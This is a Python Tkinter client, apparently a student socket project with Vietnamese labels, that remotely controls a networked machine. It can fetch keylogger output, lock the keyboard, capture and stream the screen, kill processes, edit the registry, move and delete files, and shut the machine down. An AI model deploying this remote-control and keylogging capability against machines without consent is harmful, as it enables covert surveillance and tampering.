import tkinter as tk
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
from tkinter import filedialog
from tkinter.filedialog import asksaveasfile

from PIL import ImageTk, Image
import socket
from fileinput import filename
import os
import socket,cv2, pickle,struct

HEADER = 1024
FORMAT = "utf-8"
port = 1010
ip_addr = ''
cn = 0
filename = ''

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error as err:
    print("socket creartion failed with error %s"%(err))


def send(str):
    s.sendall(str.encode(FORMAT))
    msg = s.recv(HEADER)
    if msg == b"Msg received":
        return 1
    return 1

def connect():
    global ip_addr
    global cn
    ip_addr = textIp.get()
    try: 
        s.connect((ip_addr,port))
        messagebox.showinfo("Message", "Connected susseccfully")
        cn = 1
    except socket.error as err:
        messagebox.showinfo("Message", "Error connecting to server.")

def disconnect():
    send('EXIT')
 
def keystroke_keylock():
    def hook():
        send("HOOK")
    
    def unhook():
        send("UNHOOK")
    
    def print_kb():
        send("PRINT KEYBOARD")
        msg = s.recv(HEADER).decode(FORMAT)
        if msg != "None!!!":
            text_keystroke.insert(END,msg)
    def lock():
        send("LOCK")

    def unlock():
        send("UNLOCK")

    def clear_kb():
        text_keystroke.delete("1.0","end")
    
    def on_closing_ks():
            send("QUIT")
            ks.destroy()

    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("KEYLOG")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return

    ks = Toplevel(gui)
    ks.title("Keylogger")
    button_lock = Button(ks, text="Lock", width=10, command=lock)
    button_unlock = Button(ks, text="Unlock", width=10, command=unlock)
    button_hook = Button(ks, text="Hook", width=10, command=hook)
    button_unHook = Button(ks, text="Unhook", width=10, command=unhook)
    button_print = Button(ks, text="Print", width=10, command=print_kb)
    button_clear = Button(ks, text="Clear", width =10, command=clear_kb)

    button_lock.grid(row=0,column=0,padx=5,pady=5,sticky='NSEW')
    button_unlock.grid(row=1,column=0,padx=5,pady=5,sticky='NSEW')
    button_hook.grid(row=2,column=0,padx=5,pady=5,sticky='NSEW')
    button_unHook.grid(row=3,column=0,padx=5,pady=5,sticky='NSEW')
    button_print.grid(row=4,column=0,padx=5,pady=5,sticky='NSEW')
    button_clear.grid(row=5,column=0,padx=5,pady=5,sticky='NSEW')

    text_frame = Frame(ks)
    text_frame.grid(rowspan=6,row=0, column=1,pady=5,sticky='NSEW')
    text_keystroke = Text(text_frame, width=48)
    text_keystroke.grid(rowspan=6,row=0, column=0,padx=5,pady=5,sticky='NSEW')

    bar = Scrollbar(text_frame, orient="vertical", command=text_keystroke.yview)
    bar.grid(rowspan=6, row=0, column=2, sticky='NS')
    text_keystroke.configure(yscrollcommand=bar.set)

    ks.protocol("WM_DELETE_WINDOW", on_closing_ks)

def shutdown():
    global cn
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    send("SHUTDOWN")
    disconnect()
    cn = 0

def logout():
    global cn
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    send("LOGOUT")
    disconnect()
    cn = 0

def app_running():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("APPLICATION")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return

    def xem():
        send("XEM")
        full_msg = ''
        msg = s.recv(HEADER).decode(FORMAT)
        splits = msg.split('\n')
        data = []
        for e in splits:
            t = e.split(' ')
            data.append((t[0], t[len(t)-1]))
        x = data.pop(0)
        x = data.pop(0)
        
        for i in app_tree.get_children():
            app_tree.delete(i)

        for setA in data:
            app_tree.insert('', END, values = setA)
        
    def kill():
        def on_closing_kill():
            send("QUIT")
            kill.destroy()
        def killID():
            send("KILLID")
            msg = inputID.get()
            send(msg)
            req = s.recv(HEADER).decode(FORMAT)
            if req == 'Done!!!':
                messagebox.showinfo("Message", "App was killed")
            if req == 'Error!!!':
                messagebox.showinfo("Message", "App not found")

        msg = send("KILL")
        kill = Toplevel(ar)
        kill.title("Kill")

        inputID = Entry(kill, width=30)
        button_killid = tk.Button(kill, text="Kill",width=15,command=killID)

        inputID.grid(row=0,column=0,padx=10,pady=10,sticky='NSEW')
        button_killid.grid(row=0,column=1,padx=10,pady=10,sticky='NSEW')
        inputID.insert(END,"Input ID")

        kill.protocol("WM_DELETE_WINDOW", on_closing_kill)

    def xoa():
        for i in app_tree.get_children():
            app_tree.delete(i)

    def start():
        def on_closing():
            send("QUIT")
            start.destroy()
        def startID():
            send("STARTID")
            msg = inputID.get()
            send(msg)
            req = s.recv(HEADER).decode(FORMAT)
            if req == 'Done!!!':
                messagebox.showinfo("Message", "App was started")
            if req == 'Error!!!':
                messagebox.showinfo("Message", "Error")

        msg = send("START")
        start = Toplevel(ar)
        start.title("Start")

        inputID = Entry(start, width=30)
        button_killid = tk.Button(start, text="Start", width=15,command=startID)

        inputID.grid(row=0,column=0,padx=10,pady=10,sticky='NSEW')
        button_killid.grid(row=0,column=1,padx=10,pady=10,sticky='NSEW')
        inputID.insert(END,"Input name")
        start.protocol("WM_DELETE_WINDOW", on_closing)

    def on_closing_ar():
            send("QUIT")
            ar.destroy()

    ar = Toplevel(gui)
    ar.title("App")
    button_kill = Button(ar, text="Kill", width=10, command=kill)
    button_xem = Button(ar, text="View", width=10, command=xem)
    button_xoa = Button(ar, text="Clear", width=10, command=xoa)
    button_start = Button(ar, text="Start", width =10, command=start)

    button_kill.grid(row=0,column=0,padx=5,pady=5,sticky='NSEW')
    button_xem.grid(row=0,column=1,padx=5,pady=5,sticky='NSEW')
    button_xoa.grid(row=0,column=2,padx=5,pady=5,sticky='NSEW')
    button_start.grid(row=0,column=3,padx=5,pady=5,sticky='NSEW')

    list_frame = Frame(ar)
    list_frame.grid(columnspan=4,row=1, column=0,pady=5,sticky='NSEW')
    
    columns = ('namea', 'id')
    app_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
    
    app_tree.heading('namea', text='Name')
    app_tree.heading('id', text='ID')

    
    app_tree.grid(columnspan=4,row=0, column=0,padx=5,pady=5,sticky='NSEW')

    bar = Scrollbar(list_frame, orient="vertical", command=app_tree.yview)
    bar.grid(row=0, column=4, sticky='NS')
    app_tree.configure(yscrollcommand=bar.set)

    ar.protocol("WM_DELETE_WINDOW", on_closing_ar)

def process_running():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("PROCESS")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return
    def xem():
        msg = send("XEM")
        full_msg = ''
        while True:
            msg = s.recv(HEADER).decode(FORMAT)
            if msg == "Complete!":
                break
            full_msg += msg
        text_process.delete("1.0","end")
        text_process.insert(END,full_msg)
        
        
    def kill():
        def on_closing_kill():
            send("QUIT")
            kill.destroy()
        def killID():
            send("KILLID")
            msg = inputID.get()
            send(msg)
            req = s.recv(HEADER).decode(FORMAT)
            if req == 'Done!!!':
                messagebox.showinfo("Message", "Process was killed")
            if req == 'Error!!!':
                messagebox.showinfo("Message", "Error")

        msg = send("KILL")
        kill = Toplevel(process)
        kill.title("Kill")
        inputID = Entry(kill, width =30)
        button_killid = Button(kill, text="Kill", width=15,command=killID)

        inputID.grid(row=0,column=0,padx=10,pady=10,sticky='NSEW')
        button_killid.grid(row=0,column=1,padx=10,pady=10,sticky='NSEW')
        inputID.insert(END,"Input ID")

        kill.protocol("WM_DELETE_WINDOW", on_closing_kill)

    def xoa():
        text_process.delete("1.0","end")

    def start():
        def on_closing():
            send("QUIT")
            start.destroy()
        def startID():
            send("STARTID")
            msg = inputID.get()
            send(msg)
            req = s.recv(HEADER).decode(FORMAT)
            if req == 'Done!!!':
                messagebox.showinfo("Message", "Process was started")
            if req == 'Error!!!':
                messagebox.showinfo("Message", "Error")

        msg = send("START")
        start = Toplevel(process)
        start.title("Start")
        inputID = Entry(start, width =30)
        button_killid = Button(start, text="Start", width=15,command=startID)

        inputID.grid(row=0,column=0,padx=10,pady=10,sticky='NSEW')
        button_killid.grid(row=0,column=1,padx=10,pady=10,sticky='NSEW')
        inputID.insert(END,"Input name")
        start.protocol("WM_DELETE_WINDOW", on_closing)

    def on_closing_pr():
            send("QUIT")
            process.destroy()

    process = Toplevel(gui)
    process.title("Process")
    button_kill = Button(process, text="Kill", width=10, command=kill)
    button_xem = Button(process, text="View", width=10, command=xem)
    button_xoa = Button(process, text="Clear", width=10, command=xoa)
    button_start = Button(process, text="Start", width =10, command=start)

    button_kill.grid(row=0,column=0,padx=5,pady=5,sticky='NSEW')
    button_xem.grid(row=0,column=1,padx=5,pady=5,sticky='NSEW')
    button_xoa.grid(row=0,column=2,padx=5,pady=5,sticky='NSEW')
    button_start.grid(row=0,column=3,padx=5,pady=5,sticky='NSEW')

    text_frame = Frame(process)
    text_frame.grid(columnspan=4,row=1, column=0,pady=5,sticky='NSEW')
    text_process = Text(text_frame, width=48)
    text_process.grid(columnspan=4,row=0, column=0,padx=5,pady=5,sticky='NSEW')

    bar = Scrollbar(text_frame, orient="vertical", command=text_process.yview)
    bar.grid(row=0, column=4, sticky='NS')
    text_process.configure(yscrollcommand=bar.set)

    process.protocol("WM_DELETE_WINDOW", on_closing_pr)

def screenshot():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    
    def take():
        send('SCREENSHOT')
        img = open("img_short.png", "wb")
        msg = s.recv(HEADER)
        while msg != b'Complete!':
            img.write(msg)
            s.sendall("rc".encode(FORMAT))
            msg = s.recv(HEADER)
        img.close()
        img = Image.open("img_short.png")
        resize_img = img.resize((710,400))
        img_show = ImageTk.PhotoImage(resize_img)
        img_label.config(image=img_show)
        img_label.update()
        scr.mainloop()

    def save():
        send('SCREENSHOT')
        files = [('Image', '*.png*'),('All Files', '*.')]
        file = asksaveasfile(mode = "wb", filetypes = files, defaultextension = files)
        print(file)
        msg = s.recv(HEADER)
        while msg != b'Complete!':
            file.write(msg)
            s.sendall("rc".encode(FORMAT))
            msg = s.recv(HEADER)
        file.close()

    send('SCREENSHOT')
    img = open("img_short.png", "wb")
    msg = s.recv(HEADER)
    while msg != b'Complete!':
        img.write(msg)
        s.send("rc".encode(FORMAT))
        msg = s.recv(HEADER)
    img.close()
    
    scr = Toplevel(gui)
    scr.title("Screen shot")
    
    button_take = Button(scr, text="Take", width=9, font=('Arial',13), height=6, command=take)
    button_save = Button(scr, text="Save", width=9, font=('Arial',13), height=6, command=save)
    
    button_take.grid(row=0, column=1, padx=10, pady=10, sticky = 'EW')
    button_save.grid(row=1, column=1, padx=10, pady=10, sticky = 'EW')

    img_frame = Frame(scr)
    img_frame.grid(row=0, column=0, rowspan=2, padx=5, pady=5, sticky = 'NSEW')

    img = Image.open("img_short.png")
    resize_img = img.resize((710,400))
    img_show = ImageTk.PhotoImage(resize_img)
    
    img_label = Label(img_frame, image=img_show)
    img_label.grid(rowspan=2, row=0, column=0, padx=5, pady=10, sticky='NSEW')
    scr.mainloop()

def videostream():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send('VIDEO')
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return

    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size: 
            packet = s.recv(4*1024) # 4K
            s.send(" ".encode(FORMAT))   
            if not packet: break
            data+=packet
            
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q",packed_msg_size)[0]
        while len(data) < msg_size:
            data += s.recv(4*1024)
            s.send(" ".encode(FORMAT))
        frame_data = data[:msg_size]
        data  = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("RECEIVING VIDEO",frame)
        if cv2.waitKey(1) == 27:
            msg = s.recv(HEADER*HEADER*HEADER)
            s.sendall("Complete!Complete!Complete!".encode(FORMAT))
            cv2.destroyAllWindows()
            break

def registry():
    def browser():
        global filename
        filename = filedialog.askopenfilename(initialdir = "/", title= "Select a file", filetype=(("registry files","*.reg"),("all files","*.*")))
        show_addr.delete(0, END)
        show_addr.insert(END, filename)
        file_reg = open(filename,"r")
        r_reg = file_reg.read(HEADER*4)
        text_reg.delete("1.0","end")
        text_reg.insert(END, r_reg)
        file_reg.close()

    def send_f():
        send("send file")
        file_reg = open(filename,"rb")
        r_reg = file_reg.read(HEADER*4)
        s.sendall(r_reg)
        file_reg.close()
        msg = s.recv(HEADER).decode(FORMAT)
        if msg == 'done':
            messagebox.showinfo("Message", "Sửa thành công.")
        else:
            messagebox.showinfo("Message", "Sửa thất bại.")

    def def_chosen(event):
        choo = reg_choosen.get()
        if choo == 'Get value':
            input_name.delete(0, END)
            input_name.insert(END,"Name value")
            input_name.grid(row=2, column=0,padx = 5,pady=10,sticky='W')

            input_value.grid_forget()
            type_value_choosen.grid_forget()
        if choo == 'Set value':
            input_name.delete(0, END)
            input_name.insert(END,"Name value")
            input_name.grid(row=2, column=0,padx = 5,pady=10, sticky='W')

            input_value.delete(0, END)
            input_value.insert(END,"Value")
            type_value_choosen.delete(0, END)

            input_value.grid(row=2, column=1,padx = 2,pady=5, sticky='W')
            type_value_choosen.set('Kiểu dữ liệu')
            type_value_choosen.grid(row=2, column=2,padx=5, sticky='EW')
        if choo == 'Delete value':
            input_name.delete(0, END)
            input_name.insert(END,"Name value")
            input_name.grid(row=2, column=0,padx = 5,pady=10, sticky='W')

            input_value.grid_forget()
            type_value_choosen.grid_forget()
        if choo == 'Create key':
            input_name.grid_forget()
            input_value.grid_forget()
            type_value_choosen.grid_forget()
        if choo == 'Delete key':
            input_name.grid_forget()
            input_value.grid_forget()
            type_value_choosen.grid_forget()
    
    def send_request():
        choo = reg_choosen.get()
        if choo == 'Get value':
            send('Get value')
            path = input_addr.get()
            valueName = input_name.get()
            send(path)
            send(valueName)
            msg = s.recv(HEADER).decode(FORMAT)
            if msg != 'error':
                text_reg2.insert(END, msg + '\n')
            else:
                text_reg2.insert(END, 'Lỗi \n')

        if choo == 'Set value':
            send('Set value')
            path = input_addr.get()
            valueName = input_name.get()
            value = input_value.get()
            typeValue = type_value_choosen.get()
            send(path)
            send(valueName)
            send(value)
            send(typeValue)
            msg = s.recv(HEADER).decode(FORMAT)
            if msg == 'done':
                text_reg2.insert(END, 'Set value thành công.\n')
            else:
                text_reg2.insert(END, 'Set value thất bại.\n')

        if choo == 'Delete value':
            send('Delete value')
            path = input_addr.get()
            valueName = input_name.get()
            send(path)
            send(valueName)
            msg = s.recv(HEADER).decode(FORMAT)
            if msg == 'done':
                text_reg2.insert(END, 'Delete value thành công.\n')
            else:
                text_reg2.insert(END, 'Delete value thất bại.\n')
            
        if choo == 'Create key':
            send('Create key')
            path = input_addr.get()
            send(path)
            msg = s.recv(HEADER).decode(FORMAT)
            if msg == 'done':
                text_reg2.insert(END, 'Create key thành công.\n')
            else:
                text_reg2.insert(END, 'Create key thất bại.\n')

        if choo == 'Delete key':
            send('Delete key')
            path = input_addr.get()
            send(path)
            msg = s.recv(HEADER).decode(FORMAT)
            if msg == 'done':
                text_reg2.insert(END, 'Delete key thành công.\n')
            else:
                text_reg2.insert(END, 'Delete key thất bại.\n')

    def del_text():
        text_reg2.delete("1.0","end")
    
    def on_closing_reg():
        send("QUIT")
        reg.destroy()

    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("REGISTRY")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return
    reg = Toplevel(gui)
    reg.title("Registry")

    #frame top
    frame_top = LabelFrame(reg,padx=20,pady=10)
   
    frame_top.grid(row=0,column=0)
    button_browser = Button(frame_top, text="Browser...", width=15, height = 1, command=browser)
    button_browser.grid(row=0, column=1)

    button_send = tk.Button(frame_top, text="Gởi nội dung", width=15, height=5, command=send_f)
    button_send.grid(row=1, column=1)
    
    show_addr = Entry(frame_top, width=80)
    show_addr.insert(END,"Đường dẫn...")
    show_addr.grid(row=0, column=0,padx = 5, pady=1)

    text_reg = Text(frame_top, width=60, height=8)
    text_reg.insert(END, "Nội dung")
    text_reg.grid(row=1,column=0,padx=5, pady=5)

    #frame bot
    frame_bot = LabelFrame(reg,text="Sửa giá trị trực tiếp", padx=20,pady=10)
    frame_bot.grid(row=1,column=0, columnspan=1)

    n=tk.StringVar()
    reg_choosen = ttk.Combobox(frame_bot,width = 97,textvariable = n)
    reg_choosen['values'] = ('Get value', 
                          'Set value',
                          'Delete value',
                          'Create key',
                          'Delete key')
    
    reg_choosen.grid(row=0, column=0,padx=5, pady=5, columnspan=3)
    reg_choosen.set('Chọn chức năng')
    reg_choosen.bind("<<ComboboxSelected>>", def_chosen)


    input_addr = Entry(frame_bot, width=100)
    input_addr.insert(END,"Đường dẫn...")
    input_addr.grid(row=1, column=0,padx=5, pady=5, columnspan=3)

    input_name = Entry(frame_bot, width=30)
    input_name.insert(END,"Name value")
    input_name.grid(row=2, column=0,padx = 5,pady=10, sticky='W')
 
    input_value = Entry(frame_bot, width=30)
    input_value.insert(END,"Value")
    input_value.grid(row=2, column=1,padx = 2,pady=5, sticky='W')

    n1=tk.StringVar()
    type_value_choosen = ttk.Combobox(frame_bot,textvariable = n1, width=30)
    type_value_choosen['values'] = ('String', 
                'Binary',
                'DWORD',
                'QWORD',
                'Multi-String',
                'Expandable String')
    
    type_value_choosen.set('Kiểu dữ liệu')
    type_value_choosen.grid(row=2, column=2,padx=5, sticky='EW')

    text_reg2 = Text(frame_bot, width=70, height=8)
    text_reg2.grid(row=4,column=0,padx=5, pady=5, columnspan=3, sticky='NSEW')
 
    button_send2 = tk.Button(frame_bot, text="Gởi", width=15, command=send_request)
    button_send2.grid(row=5, column=0, padx = 5, sticky=E) 
    
    button_del = tk.Button(frame_bot, text="Xóa", width=15, command=del_text)
    button_del.grid(row=5, column=2, padx = 5, sticky=W)
    reg.protocol("WM_DELETE_WINDOW", on_closing_reg)
    reg.mainloop()

def macaddress():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("MAC")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return
    msg = s.recv(HEADER).decode(FORMAT)

    mac = Toplevel(gui)
    mac.title("Mac address")

    frameMA = LabelFrame(mac,bg = "black", padx=0,pady=0)
    frameMA.grid(row=0,column=0)

    text_mac = Text(frameMA, background = "black",fg = "white",font = ("Arial", 12), width=50, height=3)
    text_mac.insert(END, "\n  Physical Adress..........: " + msg)
    text_mac.grid(row=0,column=0,padx=0, pady=0)

    mac.mainloop()

def folderstructure():
    if cn == 0:
        messagebox.showinfo("Message", "Not connect to server")
        return
    rt = send("FOLDER")
    if rt == 0:
      messagebox.showinfo("Message", "Can't send data to server")
      return
    
    f_name = ""

    def double_click(event):
        for click_item in tree.selection():
            item = tree.item(click_item)
            record = item['values']
            if record[1] != "File folder":
                messagebox.showinfo("Message", "This is not a folder, can not access")
                return
            send("GOTO")
            s.sendall(str(record[0]).encode(FORMAT))
            msg = s.recv(HEADER)
            data = pickle.loads(msg)
            
            files = splitListFile(data)

            for i in tree.get_children():
                tree.delete(i)
            for file in files:
                tree.insert('', END, values = file)
            
    def right_click(event):
        for click_item in tree.selection():
            item = tree.item(click_item)
            global f_name
            f_name = item['values']
            try:
                filemenu.tk_popup(event.x_root, event.y_root)
            finally:
                filemenu.grab_release()
            
    def recvf():
        global f_name
        fileadrr = filedialog.askopenfilename(initialdir = "/", title= "Select a file", 
                                                filetype=(("all files","*.*"),("jpeg files","*.jpg")))
        filename = fileadrr.split("/")
        send("RECEIVE")
        s.send((str(f_name[0]) + "\\" + filename[len(filename) - 1]).encode(FORMAT))
        file_s = open(fileadrr,"rb")
        dataf = file_s.read(HEADER)
        while (dataf):
            s.send(dataf)
            msg = s.recv(HEADER)
            dataf = file_s.read(HEADER)
        file_s.close()
        s.send("Done!".encode(FORMAT))
     
    def deletef():
        global f_name
        send("DELETE")
        if f_name[1] == "File folder":
            s.send(str(f_name[0]).encode(FORMAT))
        else:
            s.send((str(f_name[0]) + '.' + str(f_name[1])).encode(FORMAT))
        selected_item = tree.selection()[0] 
        tree.delete(selected_item)
    
    def on_closing_fol():
        send("QUIT")
        fol.destroy()

    def splitListFile(data):
        files = []
        i = 0
        for f in data:
            if "." in f:
                splits = f.split(".")
                files.append(splits)
                i += 1
            else:
                files.append((f, "File folder"))
                i += 1
        return files
    
    def back():
        send("BACK")
        msg = s.recv(HEADER)
        data = pickle.loads(msg)
            
        files = splitListFile(data)
        print(files)
        for i in tree.get_children():
            tree.delete(i)
        for file in files:
            tree.insert('', END, values = file)

    msg = s.recv(HEADER)
    data = pickle.loads(msg)

    fol = Toplevel(gui)
    fol.title("Folder")

    files = splitListFile(data)

    frame = Frame(fol)
    frame.grid(row=0, column=0, pady=5,sticky='NSEW')

    columns = ('namef', 'type')
    tree = ttk.Treeview(frame, columns=columns, show='headings')

    tree.heading('namef', text='Name')
    tree.heading('type', text='Type')

    for file in files:
        tree.insert('', END, values = file)
    
    menubar = Menu(gui)
    
    filemenu = Menu(menubar, tearoff=0)
    filemenu.add_command(label="Receive", command=recvf)
    filemenu.add_command(label="Delete", command=deletef)
    

    tree.bind('<Double-1>', double_click)
    tree.bind('<Button-3>', right_click)
    
    tree.grid(row=0, column=0, sticky='NSEW')
    scrollbar = ttk.Scrollbar(frame, orient = "vertical", command=tree.yview)
    tree.configure(yscroll=scrollbar.set)
    scrollbar.grid(row=0, column=1, sticky='NS')

    button_back=Button(fol, text="Back",width=10, bg="BLACK", fg="WHITE", command = back)
    button_back.grid(columnspan=2, row=2, column=0, padx=10, pady=5, sticky='NS')

    fol.protocol("WM_DELETE_WINDOW", on_closing_fol)
    fol.mainloop()

def close():
    global cn
    if cn == 0:
        gui.destroy()
        return

    disconnect()
    s.shutdown(2)
    s.close()
    cn = 0
    gui.destroy()

gui = tk.Tk()
gui.title("Client")
textIp = Entry(gui,text="Input", width =32)
textIp.insert(END,"Nhập địa chỉ IP")
textIp.grid(row=0, column=0, columnspan=6, padx=5, pady=10, sticky='NSEW')

button_connect=Button(gui, text="Connect",width=7, bg="BLACK", fg="WHITE", command = connect)
button_connect.grid(columnspan=2, row=0, column=4, padx=5, pady=10, sticky='E')

button_process=Button(gui,text="Folder",width=18,height=3, command = folderstructure)
button_process.grid(columnspan=2, row=1, column=0, padx=5, pady=5, sticky='NSEW')

button_video=Button(gui,text="Video screen",width=35,height=3, command = videostream)
button_video.grid(columnspan=4, row=1, column=2, padx=5, pady=5, sticky='NSEW')

button_process=Button(gui,text="Process\nRunning",width=10,height=3, command = process_running)
button_process.grid(rowspan=3, row=2, column=0, padx=5, pady=5, sticky='NSEW')

button_app=Button(gui,text="App Running",width=20,height=4, command = app_running)
button_app.grid(columnspan=2, row=2, column=1, padx=5, pady=5, sticky='NSEW')

button_shutdown=Button(gui,text="Shutdown",width=8,height=4, command=shutdown)
button_shutdown.grid(columnspan=1, row=2, column=3, padx=5, pady=5, sticky='NSEW')

button_shutdown=Button(gui,text="Logout",width=8,height=4, command=logout)
button_shutdown.grid(columnspan=1, row=3, column=1, padx=5, pady=5, sticky='NSEW')

button_screenshot=Button(gui,text="ScreenShot",width=20,height=4, command=screenshot)
button_screenshot.grid(columnspan=2, row=3, column=2, padx=5, pady=5, sticky='NSEW')

button_keystroke=Button(gui,text="Keystroke\n&\nKeylock",width=15,height=4, command=keystroke_keylock)
button_keystroke.grid(columnspan=2, rowspan=2, row=2, column=4, padx=5, pady=5, sticky='NSEW')

button_registry=Button(gui,text="Registry",width=40,height=3, command=registry)
button_registry.grid(columnspan=4, row=4, column=1, padx=5, pady=5, sticky='NSEW')

button_close=Button(gui,text="Mac\nAdress",width=7,height=3, command=macaddress)
button_close.grid(columnspan=1, row=4, column=5, padx=5, pady=5, sticky='NSEW')

gui.protocol("WM_DELETE_WINDOW", close)
gui.mainloop()



